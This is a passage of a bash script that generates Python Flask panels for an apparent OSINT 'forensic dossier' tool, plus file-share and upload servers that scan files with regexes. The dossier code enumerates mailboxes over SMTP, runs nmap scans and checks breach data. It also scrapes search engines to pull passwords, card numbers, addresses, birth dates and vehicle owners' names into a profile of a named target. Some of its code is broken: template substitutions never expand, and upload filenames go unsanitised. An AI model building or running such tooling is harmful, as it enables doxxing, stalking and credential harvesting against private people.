            domain = clean_data.split('@')[-1]
            report.append(f"\n=== [EMAIL FORENSIC: {clean_data}] ===")
            report.append(f"[EML] {'TARGET DOMAIN':<14} : {domain}")
            
            dns_resolver = aiodns.DNSResolver()
            dns_records = ['MX', 'TXT', 'SPF', 'SOA', 'NS', 'CNAME', 'PTR', 'CAA', 'SRV']
            
            # 1. Параллельный DNS сбор
            async def get_dns(rec):
                try:
                    res = await dns_resolver.query(domain, rec)
                    return f"[DNS] {rec:<12} : {str(res[0])}"
                except: return f"[DNS] {rec:<12} : NOT FOUND"
            
            report.extend(await asyncio.gather(*[get_dns(r) for r in dns_records]))
            
            # 2. Экспертный слой безопасности (DMARC + SSL)
            report.append("\n--- [EXPERT FORENSIC LAYER]")
            try:
                dmarc = await dns_resolver.query(f"_dmarc.{domain}", 'TXT')
                report.append(f"[SEC] {'DMARC POLICY':<14} : {str(dmarc[0])}")
            except: report.append(f"[SEC] {'DMARC POLICY':<14} : NOT CONFIGURED")
            
            # Анализ SSL (криминалистический отпечаток)
            try:
                import ssl, socket
                ctx = ssl.create_default_context()
                with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
                    s.settimeout(3)
                    s.connect((domain, 443))
                    cert = s.getpeercert()
                    issuer = dict(x[0] for x in cert.get('issuer', []))
                    report.append(f"[SSL] {'ISSUER':<14} : {issuer.get('organizationName', 'Unknown')}")
            except: report.append(f"[SSL] {'ISSUER':<14} : UNABLE TO VERIFY")
            
            # 3. Breach Intel
            try:
                async with session.get(f"https://api.breachdirectory.org/v1/check?term={clean_data}", timeout=4) as r:
                    data_br = await r.json()
                    report.append(f"[SEC] {'BREACH STATUS':<14} : {'[!!!] BREACHED' if data_br.get('found') else 'CLEAN'}")
            except: report.append(f"[SEC] {'BREACH STATUS':<14} : UNAVAILABLE")
            
            # 4. SMTP VALIDATION (Threaded)
            report.append("\n--- [MAILBOX VALIDATION (THREADED)]")
            def smtp_check():
                try:
                    from dns import resolver as sync_resolver
                    import smtplib
                    mx = sync_resolver.resolve(domain, 'MX')[0].exchange
                    with smtplib.SMTP(str(mx), timeout=5) as s:
                        s.helo(); s.mail('audit@security.test')
                        code, _ = s.rcpt(clean_data)
                        return f"[SMTP] {'STATUS':<14} : {'ACTIVE' if code == 250 else 'INACTIVE'} (Code: {code})"
                except: return f"[SMTP] {'STATUS':<14} : PROTECTED/BLOCKED"
            
            report.append(await asyncio.to_thread(smtp_check))
            
            # 5. Эвристическая оценка риска
            risk = "LOW" if ("gmail" in domain or "outlook" in domain) else "MEDIUM"
            if "[!!!] BREACHED" in report[-3]: risk = "CRITICAL"
            report.append(f"[SEC] {'RISK LEVEL':<14} : {risk}")
            
            report.append("=== [END OF ANALYSIS] ===")
            
        # --- 4. NICKNAME: ЦИФРОВОЙ СЛЕД ---
        elif re.match(r'^[a-zA-Z0-9_]{3,20}$', data):
            report.append(f"\n=== [DIGITAL FOOTPRINT: {data}] ===")
            platforms = {'GitHub': 'https://github.com/{}', 'Twitter': 'https://twitter.com/{}', 'Reddit': 'https://www.reddit.com/user/{}', 'Steam': 'https://steamcommunity.com/id/{}', 'TikTok': 'https://www.tiktok.com/@{}'}
            async def check(n, u):
                try:
                    async with session.get(u.format(data), timeout=5) as r:
                        return f"[USR] {n:<14} : {'MATCH FOUND (200)' if r.status == 200 else 'NOT FOUND'}"
                except: return f"[USR] {n:<14} : ERROR/TIMEOUT"
            report.extend(await asyncio.gather(*[check(n, u) for n, u in platforms.items()]))
            report.append("=== [END OF ANALYSIS] ===")

        # --- 5. ДОМЕН / IP / SERVER: NEXUS DEEP-RECON MODULE ---
        elif re.match(r'^([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[0-9]{1,3}(\.[0-9]{1,3}){3})$', clean_data):
            report.append(f"\n=== [NEXUS DEEP-RECON: {clean_data}] ===")
            loop = asyncio.get_event_loop()
            
            # 1. SSL/TLS CERTIFICATE FORENSIC (Проверка реального владельца инфраструктуры)
            report.append(f"\n--- [SSL/TLS HANDSHAKE ANALYZER]")
            try:
                cmd_ssl = f"echo | openssl s_client -connect {clean_data}:443 -servername {clean_data} 2>/dev/null | openssl x509 -noout -subject -issuer -dates"
                res = await loop.run_in_executor(None, lambda: subprocess.run(cmd_ssl, shell=True, capture_output=True, text=True))
                if res.returncode == 0:
                    report.extend([f"[SSL] {line.strip()}" for line in res.stdout.splitlines()])
                else:
                    report.append("[SSL] {'STATUS':<14} : HANDSHAKE REJECTED/PROTECTED")
            except Exception as e: report.append(f"[SSL] {'ERROR':<14} : {str(e)}")

            # 2. NETWORK PATH & GEO-LOCATION (Определение физического расположения узла)
            report.append(f"\n--- [INFRASTRUCTURE GEOPOSITIONING]")
            try:
                # Извлекаем IP через DNS
                import socket
                ip = socket.gethostbyname(clean_data)
                report.append(f"[NET] {'RESOLVED IP':<14} : {ip}")
                
                # Доп. инфо через API
                async with session.get(f"http://ip-api.com/json/{ip}", timeout=5) as r:
                    geo = await r.json()
                    report.extend([
                        f"[NET] {'ISP/ORG':<14} : {geo.get('isp')}",
                        f"[NET] {'REGION/CITY':<14} : {geo.get('city')}, {geo.get('country')}"
                    ])
            except: report.append("[NET] {'GEO':<14} : UNABLE TO LOCATE")

            # 3. NMAP VULNERABILITY SURFACE (Анализ открытых векторов атак)
            report.append(f"\n--- [ACTIVE PROBE: VULNERABILITY SURFACE]")
            cmd_nmap = ['nmap', '-F', '-sV', '-T4', clean_data]
            res = await loop.run_in_executor(None, lambda: subprocess.run(cmd_nmap, capture_output=True, text=True))
            if res.returncode == 0:
                for line in res.stdout.splitlines():
                    if '/' in line and ('open' in line or 'closed' in line):
                        report.append(f"[NMP] {line.strip()}")
            
            report.append("=== [END OF ANALYSIS] ===")
            
    return render_template_string(render_prime_page("FULL dispatch REPORT", f"<pre>{chr(10).join(report)}</pre><a href='/'>RETURN</a>"))                                  

@app.route('/searinfo', methods=['POST'])
async def searinfo():
    query_data = {
        "fio": request.form.get("fio"),
        "address": request.form.get("address"),
        "phone": request.form.get("phone"),
        "immatriculation": request.form.get("immatriculation")
    }

    BAD_DOMAINS = ["yandex.ru", "mail.ru", "ok.ru", "dzen.ru", "youtube.com", "pinterest.com"]
    
    # Регулярные выражения для анализа сырого текстового контента выдачи
    PATTERNS = {
        "EMAIL": r'\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b',
        "PASSWORD": r'(?:pass(?:word)?|pwd|пароль|secret)[:\s=]+([^\s\n]{4,20})',
        "FINANCIAL": r'\b\d{1,3}(?:[.,]\d{3})*(?:[.,]\d{2})?\s?(?:руб|rub|usd|eur|долл|€|\$)\b',
        "CARD": r'\b(?:\d[ -]*?){13,16}\b',
        "CAREER": r'(?:работал|должность|профессия|компания|директор|менеджер|опыт|место работы|основатель|poste|profession|directeur|nommé|décret|fondateur|président|pdg|ceo)[:\s=]+([^\.\n]{5,80})',
        "REPUTATION": r'(?:суд|иск|репутация|задолженность|взыскание|уволен|штраф|скандал|condamnation|procès|justice|enquête|audience|faillite)[:\s=]+([^\.\n]{5,80})',
        "OWNER_NAME": r'(?:propriétaire|vendeur|titulaire|владелец|продавец|собственник|par|nom)[:\s=]+([a-zA-Zа-яА-ЯёЁ\-\s]{3,30})',
        "VEHICLE_LOCATION": r'(?:ville|région|adresse|город|регион|ул\.|rue)[:\s=]+([^\.\n]{5,50})',
        "SALE_DETAILS": r'(?:leboncoin|lacentrale|auto\.ru|avito|argus|prix|proбег|km|vendu|продажа)[:\s=]+([^\.\n]{5,60})'
    }

    DYNAMIC_EXTRACTORS = {
        "BIRTH": r'(?:né[e]? le|родился|родилась|дата рождения|birth(?:\s?date)?|naissance)[:\s=]*([0-9]{1,2}[./\s][0-9]{1,2}[./\s][0-9]{4}|[0-9]{1,2}\s(?:[a-zA-Zéûа-яА-ЯёЁ]+)\s[0-9]{4}[^\.\,\)]*)',
        "PHONE_PARSER": r'(?:\+?[\d\s\-()]{9,16})',
        "ADDRESS_PARSER": r'(?:\d{1,4}\s(?:rue|avenue|boulevard|place|allée|parvis|parc|route|ул\.|пер\.)[^\.\n]{10,80})'
    }

    dorks = []
    search_token = ""

    if query_data['fio']:
        search_token = query_data['fio'].split()[0].lower()
        b = query_data['fio']
        dorks.extend([
            f'"{b}"', 
            f'"{b}" site:gouv.fr', 
            f'"{b}" "biographie" OR "parcours"',
            f'site:fr.wikipedia.org "{b}"'
        ])
    elif query_data['immatriculation']:
        raw_plate = query_data['immatriculation'].strip()
        search_token = raw_plate.split()[0].lower()
        clean_plate = re.sub(r'[\s\-]', '', raw_plate.split()[0])
        
        dorks.extend([
            f'"{raw_plate}"', 
            f'"{raw_plate.split()[0]}"', 
            f'"{clean_plate}"', 
            f'"{raw_plate.split()[0]}" (vendeur OR propriétaire OR "carte grise" OR владелец OR собственник)',
            f'"{raw_plate.split()[0]}" (site:leboncoin.fr OR site:lacentrale.fr OR site:forum-auto.caradisiac.com)',
            f'"{raw_plate.split()[0]}" (site:auto.ru OR site:avito.ru OR site:drive2.ru)'
        ])

    session_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/126.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8",
        "Connection": "keep-alive"
    }

    aggregated_profile = {
        "FULL_NAME": query_data['fio'] or "NOT_SPECIFIED (VEHICLE-BASED TARGETING)",
        "ESTIMATED_POST": "NOT_FOUND",
        "BIRTH_INFO": "NOT_FOUND",
        "OFFICIAL_ADDRESS": query_data['address'] or "NOT_FOUND",
        "CONTACT_PHONES": query_data['phone'] or "NOT_FOUND",
        "FOUND_EMAILS": set(),
        "CHRONOLOGY": set(),
        "DETECTED_URLS": set(),
        "WIKI_DUMP": ""
    }

    async with aiohttp.ClientSession(headers=session_headers) as session:
        
        # Модуль 1: Википедия (для таргета по ФИО)
        if query_data['fio']:
            formatted_name = query_data['fio'].replace(" ", "_")
            wiki_api_url = f"https://fr.wikipedia.org/api/rest_v1/page/html/{quote(formatted_name)}"
            try:
                async with session.get(wiki_api_url, timeout=15) as wp_r:
                    if wp_r.status == 200:
                        wp_html = await wp_r.text()
                        wp_clean = re.sub(r'<[^>]+>', ' ', wp_html)
                        wp_clean = re.sub(r'\s+', ' ', wp_clean).strip()
                        aggregated_profile["WIKI_DUMP"] = wp_clean
                        aggregated_profile["DETECTED_URLS"].add(f"https://fr.wikipedia.org/wiki/{formatted_name}")
                        
                        birth_m = re.search(DYNAMIC_EXTRACTORS["BIRTH"], wp_clean, re.IGNORECASE)
                        if birth_m:
                            raw_birth = birth_m.group(1).strip()
                            aggregated_profile["BIRTH_INFO"] = re.sub(r'[\)\}\]]', '', raw_birth).strip()
                            
                        detected_status = "NOT_FOUND"
                        global_markers = [
                            "Président", "Directeur", "PDG", "CEO", "Ministre", "Député", "Procureur", 
                            "Juge", "Avocat", "Fondateur", "Actionnaire", "Scientifique", "Ingénieur"
                        ]
                        
                        for marker in global_markers:
                            marker_pattern = rf"\b{marker}[e]?\b"
                            if re.search(marker_pattern, wp_clean[:500], re.IGNORECASE):
                                context_match = re.search(rf"\b{marker}[e]?\s+(?:de|du|d'|en|à)\s+([A-Z][a-zA-Zа-яА-ЯёЁ\s\-\d]+)(?:\b|,|\.)", wp_clean[:700])
                                if context_match:
                                    detected_status = context_match.group(0).strip()
                                    detected_status = re.sub(r'[,.\(\)]+$', '', detected_status).strip()
                                    break
                                else:
                                    detected_status = marker
                                    break
                                    
                        if detected_status != "NOT_FOUND":
                            aggregated_profile["ESTIMATED_POST"] = detected_status

                        sentences = re.split(r'\s*\.\s*', wp_clean)
                        UNIVERSAL_CAREER_TRIGGERS = ["nommé", "décret", "élut", "élu", "recruté", "fondateur", "carrière", "devient", "назначен", "указ", "избран", "основал"]

                        for sentence in sentences:
                            sentence = sentence.strip()
                            year_match = re.search(r'\b(19\d{2}|20\d{2})\b', sentence)
                            if year_match:
                                found_year = year_match.group(1)
                                if any(trigger in sentence.lower() for trigger in UNIVERSAL_CAREER_TRIGGERS):
                                    clean_sentence = re.sub(r'\[\s*\d+\s*\]', '', sentence)
                                    clean_sentence = re.sub(r'\s+', ' ', clean_sentence).strip()
                                    if len(clean_sentence) > 25 and not any(bad in clean_sentence.lower() for bad in ["chatprompt", "script"]):
                                        aggregated_profile["CHRONOLOGY"].add(f"[{found_year}] -> {clean_sentence}")
            except:
                pass

        # Модуль 2: Обработка поисковых систем
        tasks = []
        for d in dorks:
            tasks.append(("GOOGLE", d, f"https://www.google.com/search?q={quote(d)}&num=30"))
            tasks.append(("BING", d, f"https://www.bing.com/search?q={quote(d)}&count=30"))

        async def scan_worker(eng, d, url):
            await asyncio.sleep(random.uniform(2.0, 4.0))
            try:
                async with session.get(url, timeout=25) as r:
                    html = await r.text()
                    
                    if "défi" in html.lower() or "captcha" in html.lower() or r.status == 429:
                        return f"[{eng}] DETECTED ANTI-BOT BLOCKADE (CAPTCHA TRIPPED). STREAM TERMINATED.\n" + "-"*80
                    
                    html_clean = re.sub(r'<script[^>]*>([\s\S]*?)</script>', ' ', html)
                    html_clean = re.sub(r'<style[^>]*>([\s\S]*?)</style>', ' ', html_clean)
                    visible_text = re.sub(r'<[^<]+?>', ' ', html_clean)
                    visible_text = re.sub(r'\s+', ' ', visible_text)
                    
                    # ИСПРАВЛЕНО: Убран мусорный префикс со ссылкой на посторонний словарь
                    clean_trace_url = str(url).strip()
                    output = [f"[{eng}] QUERY: {d}", f"  [URL TRACE]: {clean_trace_url}"]
                    
                    if search_token and search_token in visible_text.lower():
                        extracted_snippets = []
                        for match in re.finditer(re.escape(search_token), visible_text, re.IGNORECASE):
                            start = max(0, match.start() - 130)
                            end = min(len(visible_text), match.end() + 130)
                            snippet = visible_text[start:end].strip()
                            
                            if len(snippet) > 40 and not any(x in snippet.lower() for x in ["error-lite", "commentaires sur", "accessibilité", "passer au contenu", "recherche images", "recherches associées"]):
                                extracted_snippets.append(f"... {snippet} ...")

                        if extracted_snippets:
                            label = "[VEHICLE ONLINE MENTIONS & TRACES]" if query_data['immatriculation'] else "[NEWS & PUBLIC RECOGNITION]"
                            output.append(f"  {label}:")
                            for snip in list(set(extracted_snippets))[:3]:
                                output.append(f"    - {snip}")
                        
                        emails = re.findall(PATTERNS["EMAIL"], visible_text, re.IGNORECASE)
                        for em in emails:
                            if "duckduckgo" not in em.lower():
                                aggregated_profile["FOUND_EMAILS"].add(em.lower())

                        output.append("  [EXHAUSTIVE EXTRACTED ARTIFACTS]:")
                        
                        UI_BLACKLIST = [
                            "pertinence", "recherche", "images", "vidéos", "cartes", "actualité", "outils", 
                            "rechercher", "loading", "propri", "or", "and", "site", "chiffres", "lettres",
                            "vendeur", "propriétaire", "собственник", "владелец", "les associ", "associées", 
                            "les associés", "recherches", "recherches associées", "tri par", "filtrer",
                            "journalistes", "les journalistes", "les journalistes d"
                        ]

                        for k, regex in PATTERNS.items():
                            found = re.findall(regex, visible_text, re.IGNORECASE)
                            if found:
                                clean_found = []
                                for item in set(found):
                                    val = str(item).strip()
                                    val_lower = val.lower()
                                    
                                    if any(bad in val_lower for bad in ["chatprompt", "surface", "window"]):
                                        continue
                                        
                                    if len(val) < 2 or any(op in val for op in ["(", ")", "OR", "site:"]):
                                        continue
                                        
                                    if k == "OWNER_NAME":
                                        if val_lower in UI_BLACKLIST or any(ui in val_lower for ui in ["les associ", "recherches", "journaliste"]):
                                            continue
                                            
                                        if val_lower.startswith("les ") or val_lower.startswith("des ") or val_lower.startswith("par ") or val_lower.startswith("parми "):
                                            continue
                                            
                                        if re.search(r'\s[a-z]$', val_lower):
                                            continue
                                            
                                        if len(val_lower.split()) < 2 and val_lower in ["de", "par", "nom", "sur"]:
                                            continue

                                    clean_found.append(val)

                                if clean_found:
                                    output.append(f"    -> [{k}]: {', '.join(clean_found)[:200]}")
                                    
                                    if k == "OWNER_NAME" and aggregated_profile["FULL_NAME"].startswith("NOT_SPECIFIED"):
                                        aggregated_profile["FULL_NAME"] = clean_found[0].upper() + " (IDENTIFIED VIA VEHICLE)"
                        
                        if output[-1] == "  [EXHAUSTIVE EXTRACTED ARTIFACTS]:":
                            output.pop()
                            
                        return "\n".join(output) + "\n" + "-"*80
                    return None
            except:
                return None

        results = [r for r in await asyncio.gather(*[scan_worker(e, d, u) for e, d, u in tasks]) if r]

    # СБОРКА ИТОГОВОГО ОТЧЕТА
    report = []
    report.append("================================================================================")
    report.append("=== [NEXUS COMPREHENSIVE FORENSIC DOSSIER PRIMARY IDENTIFICATION MASTER-CARD] ===")
    report.append("================================================================================")
    
    if query_data['immatriculation'] and not query_data['fio']:
        report.append(f"  [+] VEHICLE TARGET  : {query_data['immatriculation'].upper()}")
        report.append(f"  [+] DETECTED OWNER  : {aggregated_profile['FULL_NAME']}")
    else:
        report.append(f"  [+] TARGET IDENTITY : {aggregated_profile['FULL_NAME'].upper()}")
        report.append(f"  [+] CURRENT STATUS  : {aggregated_profile['ESTIMATED_POST']}")
        
    report.append(f"  [+] DATE/PLACE BIRTH: {aggregated_profile['BIRTH_INFO']}")
    report.append(f"  [+] REGISTRATION ADDR: {aggregated_profile['OFFICIAL_ADDRESS']}")
    report.append(f"  [+] TELEPHONE LINES : {aggregated_profile['CONTACT_PHONES']}")
    report.append(f"  [+] CAPTURED EMAILS : {', '.join(aggregated_profile['FOUND_EMAILS']) if aggregated_profile['FOUND_EMAILS'] else 'NOT_FOUND'}")
    
    report.append("\n  [+] TARGET INTELLIGENCE NETWORK LOCATIONS (DIRECT TARGET SITES):")
    
    report.append("\n  [+] DYNAMICALLY EXTRACTED CAREER CHRONOLOGY & EVENTS:")
    if aggregated_profile["CHRONOLOGY"]:
        for rank in sorted(list(aggregated_profile["CHRONOLOGY"]))[:25]:
            report.append(f"    -> {rank}")
    else:
        report.append("    -> NO LOGISTICAL TIMELINES EXTRACTED FROM SNIPPETS")

    report.append("\n================================================================================")
    report.append("=== [RAW SEARCH ENGINE ANALYTICAL ENGINE WORKER TRACKS] ===")
    report.append("================================================================================\n")
    
    for res in results:
        report.append(res)
        
    report.append("=== [END OF ANALYSIS — MAXIMUM FORENSIC RECORD COMPLETION] ===")
    
    # ИСПРАВЛЕНО: Слияние строк вынесено в отдельную переменную за пределы f-строки
    final_text_report = "\n".join(report)
    
    return render_template_string(
        render_prime_page("MAXIMUM FORENSIC DOSSIER", f"<pre>{final_text_report}</pre><br><a href='/'>[ RETURN ]</a>")
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
}



generate_aio_server_code_raw() {
    # 1. Сборка UI шаблонов в локальные переменные для бесшовной интеграции
    local core_tpl="$(generate_core_template)"
    local form_tpl="$(generate_core_form_template)"

    # 2. ВЫВОД ПЕРВОЙ ЧАСТИ (Импорты и инициализация Flask)
    # Убрано перенаправление '> /tmp/aio_server.py', теперь поток идет наружу
    cat << 'EOF'
from flask import Flask, request, render_template_string, session
import re
import os
import shutil
import subprocess
import platform
import requests
import ssl
import urllib3
import math
import socket
import random
import time
import phonenumbers
import asyncio
import aiodns
import aiohttp
import smtplib
import dns.asyncresolver
from phonenumbers import geocoder, carrier, number_type
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from urllib.parse import quote
from datetime import datetime

app = Flask(__name__)

# --- ШАБЛОНЫ (ВСТАВЛЕНЫ АВТОМАТИЧЕСКИ) ---
EOF

    # 3. ВЫВОД ШАБЛОНОВ В ОБЩИЙ ПОТОК
    echo "$core_tpl"
    echo "$form_tpl"

    # 4. ВЫВОД ФИНАЛЬНОЙ ЧАСТИ ЛОГИКИ И СЕРВЕРА
    # Убрано перенаправление '>> /tmp/aio_server.py' и исправлен синтаксис роута Python
    cat << 'EOF'

# --- ВНУТРЕННИЕ ФУНКЦИИ (NEXUS ENGINE) ---

@app.route('/')
def index():
    # Инициализация контекста страницы для CAME_HYBRID_GATEWAY
    body = "<div style='text-align:center;'><h3>NEXUS AIO HYBRID SYSTEM ONLINE</h3><p>Secure sector connection verified.</p></div>"
    return render_template_string(render_prime_page("CAME_HYBRID_GATEWAY_v2.5", body))


if __name__ == '__main__':
    # Запуск сервера на оригинальном порту 5002 для бесшовной интеграции наружу
    app.run(host='0.0.0.0', port=5002, debug=False)
EOF
}


# ==============================================================================
# @description: Интегрированный кросс-платформенный генератор веб-панели Share-Server v2.0
# МОДЕРНИЗАЦИЯ: Внедрение сквозного пре-даунлоад контроля CAME с логикой TOTAL OUTBOUND PURGE
# ФУНКЦИОНАЛ: Сканирование файлов «на лету» перед отдачей, моментальное удаление угроз с хоста
# АРХИТЕКТУРА: Flask-интерфейс, защита сетевых клиентов от скачивания деструктивных векторов
# ==============================================================================

generate_share_server_code_raw() {
    # 1. Собираем регулярку из массива прямо здесь
    local regex_pattern=$(IFS="|"; echo "${GLOBAL_AV_MATRIX[*]}")

    # 2. Загружаем шаблон
    local template=$(generate_core_template)

    # 3. Твой оригинальный код (теперь используем сформированную строку)
    cat << 'EOF'
from flask import Flask, render_template_string, send_from_directory, abort
import os
import re

app = Flask(__name__)

# Регулярка встроена прямо в код
GLOBAL_AV_PIPE_REGEX = r"""$regex_pattern"""

SHARE_DIR = '/root/share'

if not os.path.exists(SHARE_DIR):
    os.makedirs(SHARE_DIR, exist_ok=True)

$template
def get_file_icon(filename):
    """Определяет иконку в зависимости от расширения файла."""
    ext = filename.split('.')[-1].lower() if '.' in filename else ''
    icons = {
        'pdf': '📕',
        'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'webp': '🖼️',
        'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
        'py': '💻', 'js': '💻', 'html': '💻', 'sh': '💻', 'css': '💻',
        'txt': '📄', 'md': '📝', 'doc': '📄', 'docx': '📄',
        'mp4': '🎬', 'mkv': '🎬', 'mov': '🎬',
        'mp3': '🎵', 'wav': '🎵', 'flac': '🎵'
    }
    return icons.get(ext, '📄')

@app.route('/')
def index():
    try:
        files = sorted(os.listdir(SHARE_DIR))
    except:
        files = []
    
    # Формируем сетку файлов с использованием оригинальных стилей .file-grid и .file-item
    grid_content = '<div class="file-grid">'
    for f in files:
        icon = get_file_icon(f)
        grid_content += f"""
        <a href="/get/{f}" class="file-item" target="_blank">
            <span class="file-icon" style="font-size: 2.5rem; display: block; margin-bottom: 10px;">{icon}</span>
            <div style="font-size: 0.8rem; word-break: break-all; line-height: 1.2;">{f}</div>
        </a>
        """
    
    if not files:
        grid_content += '<p style="color: var(--accent); font-style: italic; grid-column: 1/-1; opacity: 0.5;">[ SECTOR_EMPTY: No data detected ]</p>'
    
    grid_content += '</div>'
    grid_content += f'<div style="margin-top: 30px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); font-family: monospace; font-size: 0.7rem; opacity: 0.5;">MOUNT_POINT: {SHARE_DIR}</div>'

    return render_template_string(render_prime_page("SECURE_FILE_DISTRIBUTION_v2.0", grid_content))

@app.route('/get/<filename>')
def get_file(filename):
    # Обеспечение базовой безопасности путей (предотвращение Path Traversal)
    target_path = os.path.normpath(os.path.join(SHARE_DIR, filename))
    if not target_path.startswith(SHARE_DIR) or not os.path.exists(target_path):
        abort(404)
        
    # Игнорируем директории, если они случайно попали в запрос
    if os.path.isdir(target_path):
        abort(400)

    is_infected = False
    report = []

    try:
        # --- ВЕКТОР ПРЕДВАРИТЕЛЬНОГО ОУТПУТ-КОНТРОЛЯ CAME ---
        with open(target_path, 'rb') as file_buffer:
            raw_content = file_buffer.read()

        total_bytes = len(raw_content)

        # Вычисление плотности ASCII (Борьба со скрытыми крипторами / паккерами)
        printable_chars = len([b for b in raw_content if 32 <= b <= 126])
        readable_ratio = 100 if total_bytes == 0 else int((printable_chars * 100) / total_bytes)

        # Декодирование содержимого для проверки регулярными выражениями Слоев 1-4
        text_content = raw_content.decode('utf-8', errors='ignore')

        matches = []
        try:
            compiled_regex = re.compile(GLOBAL_AV_PIPE_REGEX, re.IGNORECASE | re.MULTILINE)
            for i, line in enumerate(text_content.splitlines(), 1):
                if compiled_regex.search(line):
                    matches.append(f"Line {i}: {line.strip()[:100]}")
        except Exception as regex_err:
            matches.append(f"REGEX_CORE_ERR: {str(regex_err)}")

        # Анализ полученных данных
        if total_bytes > 1000 and readable_ratio < 12:
            is_infected = True
            report.append("CRITICAL ANOMALY: High Entropy / Encrypted code signature detected.")

        if matches:
            is_infected = True
            report.append(f"MALICIOUS INTENT ISOLATED: Matched {len(matches)} active signatures.")

        # --- РУБЕЖ РЕШЕНИЯ И АННИГИЛЯЦИИ ---
        if is_infected:
            # Файл грязный — полное стирание с жесткого диска сервера, чтобы никто больше не смог его запросить
            if os.path.exists(target_path):
                os.remove(target_path)

            # Вместо скачивания файла возвращаем пользователю жесткую веб-страницу с алармом
            content = f"""
            <div class="status-box infected" style="padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center; border:1px dashed;">
                CRITICAL WARNING: OUTBOUND MALWARE ANNIHILATED
            </div>
            <p style="font-size:12px; color:var(--accent-color);">The requested object <b>{filename}</b> failed outbound security compliance and was <b>permanently purged</b> from the storage node.</p>
            <pre style="background:#111; color:#ff3d00; padding:15px; border-radius:5px; font-family:monospace; font-size:11px;">{"\n".join(report)}</pre>
            <div style="margin-top:20px;"><a href="/" class="btn">[ RETURN TO DISTRIBUTION ]</a></div>
            """
            return render_template_string(render_prime_page("OUTBOUND_SECURITY_BLOCK", content)), 403

        else:
            # Файл чист — беспрепятственно отдаем клиенту
            return send_from_directory(SHARE_DIR, filename)

    except Exception as e:
        return f"DISTRIBUTION_INTEGRITY_ERROR: {str(e)}", 500

if __name__ == '__main__':
    # Запуск сервера на оригинальном порту 5002 для бесшовной интеграции
    app.run(host='0.0.0.0', port=5002, debug=False)
EOF
}


# ==============================================================================
# @description: Интегрированный кросс-платформенный генератор веб-панели Upload-Server v2.1
# МОДЕРНИЗАЦИЯ: Внедрение сквозного пре-лоад контроля CAME с логикой TOTAL DESTRUCTION
# ФУНКЦИОНАЛ: Потоковый анализ файлов в /tmp, моментальное стирание зараженных объектов
# АРХИТЕКТУРА: Flask-интерфейс, защита целевого хранилища PRIME_LOOT от записи малвари
# ==============================================================================

generate_upload_server_code_raw() {
    # 1. Извлекаем глобальный регулярный супер-конвейер CAME (Слои 1-4)
    local regex_pattern=$(IFS="|"; echo "${GLOBAL_AV_MATRIX[*]}")

    # 2. Генерируем Base64 payload напрямую через защищенный heredoc.
    # Обратите внимание: синтаксис << 'EOF' в одинарных кавычках запрещает Bash выполнять
    # какие-либо подстановки фигурных скобок {f.filename}. Внутри кода полностью удалены комментарии '#'.
    local b64_payload
    b64_payload=$(cat << 'EOF' | base64 | tr -d '\n' | tr -d '\r'
import os
import re
import shutil

UPLOAD_DIR = os.path.join(os.environ.get('PRIME_LOOT') or '/root/prime_loot', 'inbound')

if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR, exist_ok=True)

def dynamic_handler():
    if request.method == 'GET':
        fields = [{"type": "file", "name": "file", "label": "SELECT_UPLINK_DATA"}]
        form_html = render_prime_form("/upload", fields=fields, btn_text="INITIATE SECURE UPLOAD")
        return render_template_string(render_prime_page("INBOUND_DROP_BOX_v2.1", form_html))

    elif request.method == 'POST':
        if 'file' not in request.files: 
            return "TRANSFER_ERROR", 400
            
        f = request.files['file']
        if f.filename == '': 
            return "EMPTY_FILENAME", 400
        
        tmp_path = os.path.join('/tmp', f.filename)
        f.save(tmp_path)
        
        is_infected = False
        report = []
        
        try:
            with open(tmp_path, 'rb') as file_buffer:
                raw_content = file_buffer.read()
                
            total_bytes = len(raw_content)
            
            printable_chars = len([b for b in raw_content if 32 <= b <= 126])
            readable_ratio = 100 if total_bytes == 0 else int((printable_chars * 100) / total_bytes)
            
            text_content = raw_content.decode('utf-8', errors='ignore')
            
            matches = []
            try:
                compiled_regex = re.compile(GLOBAL_AV_PIPE_REGEX, re.IGNORECASE | re.MULTILINE)
                for i, line in enumerate(text_content.splitlines(), 1):
                    if compiled_regex.search(line):
                        matches.append(f"Line {i}: {line.strip()[:100]}")
            except Exception as regex_err:
                matches.append(f"REGEX_CORE_ERR: {str(regex_err)}")
                
            if total_bytes > 1000 and readable_ratio < 12:
                is_infected = True
                report.append("CRITICAL: High Entropy Detected (Encrypted or Obfuscated Payload).")
                
            if matches:
                is_infected = True
                report.append(f"MALICIOUS_INTENT_FOUND: Matched {len(matches)} signatures.")
                
            if is_infected:
                if os.path.exists(tmp_path):
                    os.remove(tmp_path)
                
                report_str = chr(10).join(report)
                
                content = "<div class=\"status-box infected\" style=\"padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center; border:1px dashed;\">"
                content += "CRITICAL DETECTION: THREAT TOTALLY DESTROYED"
                content += "</div>"
                content += f"<p style=\"font-size:12px; color:var(--accent-color);\">File <b>{f.filename}</b> breached compliance policies and was <b>permanently deleted</b> from the environment.</p>"
                content += f"<pre style=\"background:#111; color:#ff3d00; padding:15px; border-radius:5px; font-family:monospace; font-size:11px;\">{report_str}</pre>"
                content += "<div style=\"margin-top:20px;\"><a href=\"/\" class=\"btn\">[ RETURN ]</a></div>"
                
                return render_template_string(render_prime_page("GATEWAY_THREAT_ANNIHILATION", content))
                
            else:
                final_dest_path = os.path.join(UPLOAD_DIR, f.filename)
                if os.path.exists(final_dest_path):
                    os.remove(final_dest_path)
                    
                shutil.move(tmp_path, final_dest_path)
                
                content = "<div class=\"status-box clean\" style=\"padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center;\">"
                content += "SUCCESS: UPLOAD VERIFIED"
                content += "</div>"
